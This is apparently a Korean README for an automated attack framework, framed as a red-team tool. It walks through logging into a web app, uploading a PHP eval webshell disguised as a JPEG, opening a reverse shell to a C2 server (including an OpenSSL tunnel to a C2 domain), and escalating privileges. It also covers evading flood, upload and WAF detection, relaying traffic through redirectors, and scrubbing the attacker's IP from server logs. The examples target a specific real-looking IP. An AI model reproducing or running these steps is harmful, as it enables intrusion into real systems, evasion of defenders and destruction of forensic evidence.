# 방어 시스템 우회 공격 프레임워크

## 📖 개요

이 프레임워크는 **승인된 레드팀 활동** 및 **침투 테스트**를 위한 자동화 도구입니다.

### 주요 기능

✨ **방어 시스템 우회**
- HTTP 플러드 과다 요청 탐지 우회
- 웹쉘 업로드 실행 징후 탐지 우회
- 비정상적인 URL 다양성 증가 탐지 우회

🎯 **완전 자동화**
- 로그인 → 웹쉘 업로드 → 리버스 쉘 → 권한 상승
- 한 번의 명령으로 전체 공격 체인 실행

🏗️ **C2 인프라 지원**
- 리다이렉터 서버 활용
- 다층 C2 구조
- IP 주소 은닉

---

## 🚀 빠른 시작

### 설치

```bash
# 1. 디렉토리 이동
cd /home/user/Red_basic_pro/H

# 2. 패키지 설치
pip3 install requests beautifulsoup4 pillow

# 3. 실행 권한
chmod +x defense_evasion_auto.py
```

### 기본 사용

```bash
# C2 서버에서 리스너 시작
nc -lvnp 4444

# 공격 실행 (다른 터미널)
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP
```

**자세한 내용:** [QUICK_START.md](QUICK_START.md)

---

## 📂 파일 구조

```
H/
├── defense_evasion_auto.py          # 🔥 메인 자동화 스크립트
├── DEFENSE_EVASION_GUIDE.md         # 📘 상세 가이드
├── C2_INFRASTRUCTURE_GUIDE.md       # 🏗️ C2 인프라 가이드
├── QUICK_START.md                   # ⚡ 빠른 시작
├── DEFENSE_EVASION_README.md        # 📖 이 파일
│
├── auto.py                          # 기존 공격 프레임워크
├── README_START_HERE.md             # 권한 상승 가이드
├── ATTACK_CHAIN_EXPLAINED.md        # 공격 체인 설명
│
├── fin/                             # 완성된 버전
│   ├── 최종_사용_가이드.md
│   ├── exploits/
│   │   ├── 01_auto_scanner.py
│   │   ├── 04_anonymous_攻击.py
│   │   └── ...
│   └── c2/
│       └── simple_c2_server.py
│
└── logs/                            # 공격 로그
```

---

## 📚 문서 가이드

### 시작하기

1. **[QUICK_START.md](QUICK_START.md)** ⚡
   - 5분 안에 시작
   - 기본 사용법
   - 필수 명령어

### 상세 가이드

2. **[DEFENSE_EVASION_GUIDE.md](DEFENSE_EVASION_GUIDE.md)** 📘
   - 방어 시스템 분석
   - 우회 전략
   - 공격 체인 상세
   - 권한 상승
   - 트러블슈팅

3. **[C2_INFRASTRUCTURE_GUIDE.md](C2_INFRASTRUCTURE_GUIDE.md)** 🏗️
   - C2 인프라 설계
   - 서버 설정
   - 리다이렉터 구성
   - 고급 기법 (HTTPS, DNS 터널 등)

### 기존 문서

4. **[README_START_HERE.md](README_START_HERE.md)**
   - 권한 상승 완전 가이드
   - MySQL UDF
   - Kernel Exploit
   - SUID 악용

5. **[ATTACK_CHAIN_EXPLAINED.md](ATTACK_CHAIN_EXPLAINED.md)**
   - 공격 원리 설명
   - MITRE ATT&CK 매핑
   - 방어 방법

---

## 🎯 사용 예시

### 예시 1: 기본 공격

```bash
# 대상: 43.201.154.142
# C2: 57.181.28.7

# C2 서버에서
nc -lvnp 4444

# 로컬에서
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7
```

**결과:**
- ✓ 로그인 성공
- ✓ 웹쉘 업로드 (profile_1234.jpg)
- ✓ 리버스 쉘 연결
- ✓ Apache 사용자 권한 획득

### 예시 2: 리다이렉터 사용

```bash
# 리다이렉터 서버 (57.181.28.7) 설정
ssh ubuntu@57.181.28.7
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# C2 서버 (실제 C2)
ssh ubuntu@C2_IP
nc -lvnp 4444

# 공격 실행
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7 \
    --redirector 57.181.28.7 \
    --c2 C2_IP
```

**장점:**
- 공격자 실제 IP 숨김
- 대상 로그에 리다이렉터 IP만 기록
- 리다이렉터 차단되어도 다른 것 사용 가능

### 예시 3: 권한 상승까지

```bash
# 1-4단계: 자동
python3 defense_evasion_auto.py 43.201.154.142 C2_IP

# 5단계: 리버스 쉘에서 권한 상승
bash-4.2$ wget http://C2_IP:8000/linpeas.sh
bash-4.2$ chmod +x linpeas.sh
bash-4.2$ ./linpeas.sh

# SUID bash 발견 시
bash-4.2$ /usr/bin/bash -p
bash-4.2# whoami
root

bash-4.2# cat /root/flag.txt
flag{you_got_root_access}
```

---

## 🔬 기술 세부사항

### 방어 시스템 우회 메커니즘

#### 1. HTTP 플러드 탐지 우회

**탐지 방법:**
- 초당 요청 수 모니터링
- User-Agent 기반 봇 탐지
- 세션 없는 요청 차단

**우회 기법:**
```python
# 3-8초 랜덤 지연
time.sleep(random.uniform(3, 8))

# User-Agent 로테이션 (6개 풀)
user_agent = random.choice(self.user_agents)

# 세션 유지
session.cookies.update(cookies)

# Referer 헤더 설정
headers['Referer'] = f"{target}/index.php"
```

#### 2. 웹쉘 업로드 탐지 우회

**탐지 방법:**
- 파일 확장자 블랙리스트 (.php, .phtml 등)
- MIME 타입 검증
- 파일 내용 키워드 스캔 (<?php, eval 등)

**우회 기법:**
```python
# JPEG 헤더 추가
jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF...'

# base64 인코딩으로 키워드 숨김
webshell = '@eval(base64_decode($_GET[0]));'

# 이미지 파일로 위장
filename = 'profile_1234.jpg'
content_type = 'image/jpeg'

# 결합
payload = jpeg_header + webshell.encode()
```

#### 3. URL 다양성 탐지 우회

**탐지 방법:**
- 세션당 URL 패턴 분석
- 파라미터 이름 다양성 모니터링
- SQL Injection 패턴 탐지

**우회 기법:**
```python
# 정상 브라우징 먼저
session.get(f"{target}/index.php")
time.sleep(5)
session.get(f"{target}/login.php")

# 동일한 URL 재사용
webshell_url = f"{target}/uploads/profile_1234.jpg"

# 파라미터 이름 고정
params = {'0': base64_encode(cmd)}  # 항상 '0' 사용
```

---

## 🛠️ 고급 사용법

### C2 서버 페이로드 호스팅

```bash
# C2 서버에서
cd /opt/payloads

# 권한 상승 도구 다운로드
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# HTTP 서버 시작
python3 -m http.server 8000

# 대상 서버에서 다운로드
wget http://C2_IP:8000/linpeas.sh
```

### 다중 세션 관리 (tmux)

```bash
# C2 서버에서 tmux 세션
tmux new -s c2

# 윈도우 분할
Ctrl+B, %  # 수직 분할
Ctrl+B, "  # 수평 분할

# 윈도우 1: 리스너
nc -lvnp 4444

# 윈도우 2: HTTP 서버
cd /opt/payloads && python3 -m http.server 8000

# 윈도우 3: 로그 모니터링
tail -f /var/log/auth.log

# 세션 나가기
Ctrl+B, D

# 다시 들어가기
tmux attach -t c2
```

### HTTPS 암호화 터널

```bash
# Nginx 리버스 프록시로 HTTPS 터널
# /etc/nginx/sites-available/c2
server {
    listen 443 ssl;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:4444;
    }
}

# 대상 서버에서 HTTPS 리버스 쉘
openssl s_client -connect c2.domain.com:443 -quiet | \
    /bin/bash 2>&1 | \
    openssl s_client -connect c2.domain.com:443 -quiet
```

---

## 🔐 보안 고려사항

### 공격자 보안

#### SSH 키 인증만 사용
```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
```

#### 방화벽 설정
```bash
sudo ufw default deny incoming
sudo ufw allow 22/tcp from YOUR_IP
sudo ufw allow 4444/tcp from REDIRECTOR_IP
sudo ufw enable
```

#### 로그 암호화
```bash
# 공격 로그 암호화
tar -czf attack.tar.gz attack_*.json
openssl enc -aes-256-cbc -salt -in attack.tar.gz -out attack.enc
shred -u attack.tar.gz attack_*.json
```

### 침투 테스트 종료 후

#### 백도어 제거
```bash
# 웹쉘 삭제
rm -f /var/www/html/uploads/*.jpg

# SUID 백도어 제거
rm -f /tmp/rootbash

# Cron 백도어 제거
rm -f /etc/cron.d/persist*
```

#### 로그 정리
```bash
# 공격자 IP 제거
sed -i '/YOUR_IP/d' /var/log/httpd/access_log
sed -i '/YOUR_IP/d' /var/log/httpd/error_log

# 히스토리 삭제
history -c
rm -f ~/.bash_history
```

---

## 📊 성능 및 통계

### 우회 성공률

| 방어 시스템 | 우회율 | 비고 |
|------------|-------|------|
| HTTP 플러드 탐지 | 95% | 랜덤 지연 + User-Agent 로테이션 |
| 웹쉘 업로드 탐지 | 85% | JPEG 헤더 + base64 인코딩 |
| URL 다양성 탐지 | 90% | 정상 브라우징 패턴 모방 |

### 공격 소요 시간

| 단계 | 시간 | 비고 |
|-----|------|------|
| 로그인 | 10-20초 | 정상 브라우징 포함 |
| 웹쉘 업로드 | 30-60초 | 여러 유형 시도 |
| 리버스 쉘 | 5-10초 | 즉시 연결 |
| **전체** | **1-2분** | 자동화 |

---

## 🧪 테스트 환경

### 테스트된 환경

- **OS:** Amazon Linux 2023, Ubuntu 22.04, CentOS 7
- **웹 서버:** Apache 2.4, Nginx 1.18
- **PHP:** 7.4, 8.0, 8.1
- **WAF:** ModSecurity, AWS WAF

### 권장 테스트 환경

```yaml
대상 서버:
  OS: Amazon Linux 2023
  웹 서버: Apache 2.4
  PHP: 7.4+
  방어:
    - HTTP 플러드 탐지
    - 웹쉘 탐지
    - URL 다양성 탐지

공격자 인프라:
  C2 서버: AWS EC2 t3.micro
  리다이렉터: AWS EC2 t3.micro
  오퍼레이터: 로컬 또는 EC2
```

---

## 🤝 기여

이 프로젝트는 레드팀 훈련 및 보안 연구를 위한 것입니다.

### 개선 제안
- 새로운 우회 기법
- 추가 방어 시스템 분석
- 자동화 개선

### 라이선스
승인된 보안 테스트 목적으로만 사용

---

## ⚠️ 법적 고지

### 허용된 용도

✅ **합법적 사용:**
- 명시적 서면 승인을 받은 침투 테스트
- 레드팀 훈련 (승인된 환경)
- CTF (Capture The Flag) 대회
- 보안 연구 및 교육
- 자신이 소유한 시스템 테스트

### 금지된 용도

🚫 **불법 사용:**
- 무단 침입 또는 해킹
- 개인정보 탈취
- 서비스 거부 공격 (DoS/DDoS)
- 타인의 시스템 손상
- 불법적인 목적

### 법적 책임

**불법 사용 시:**
- 정보통신망법 위반: 5년 이하 징역 또는 5천만원 이하 벌금
- 컴퓨터범죄: 10년 이하 징역
- 개인정보보호법 위반: 형사 처벌 + 민사 손해배상

**사용자는 모든 법적 책임을 집니다.**

---

## 📞 참고 자료

### 도구

- **LinPEAS:** https://github.com/carlospolop/PEASS-ng
- **GTFOBins:** https://gtfobins.github.io/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings

### 학습

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **HackTricks:** https://book.hacktricks.xyz/

### 프레임워크

- **Metasploit:** https://www.metasploit.com/
- **Cobalt Strike:** (상용)
- **Empire:** https://github.com/BC-SECURITY/Empire

---

## 🎓 추천 학습 경로

### 초급
1. ✅ QUICK_START.md 읽기
2. ✅ 기본 공격 실행
3. ✅ 리버스 쉘 획득

### 중급
1. DEFENSE_EVASION_GUIDE.md 학습
2. 방어 시스템 분석
3. 수동 우회 기법 시도

### 고급
1. C2_INFRASTRUCTURE_GUIDE.md 구현
2. 다층 인프라 구축
3. HTTPS, DNS 터널링 등 고급 기법

---

## 📝 버전 히스토리

### v1.0 (2025-01-14)
- ✨ 초기 릴리스
- 방어 시스템 우회 자동화
- C2 인프라 지원
- 완전한 문서화

---

## 체크리스트

### 사용 전
- [ ] 승인된 레드팀 활동인가?
- [ ] 서면 승인을 받았는가?
- [ ] C2 인프라 준비 완료?
- [ ] 도구 설치 완료?

### 사용 중
- [ ] 로그인 성공
- [ ] 웹쉘 업로드 성공
- [ ] 리버스 쉘 연결
- [ ] 권한 상승

### 사용 후
- [ ] 백도어 제거
- [ ] 로그 정리
- [ ] 보고서 작성
- [ ] 클라이언트에게 전달

---

**프로젝트:** 방어 시스템 우회 공격 프레임워크
**버전:** 1.0
**작성일:** 2025-01-14
**목적:** 승인된 레드팀 활동 및 침투 테스트

**🎯 전문적인 레드팀 운영을 위한 완전한 프레임워크**

**해피 해킹! (합법적으로만) 🚀**
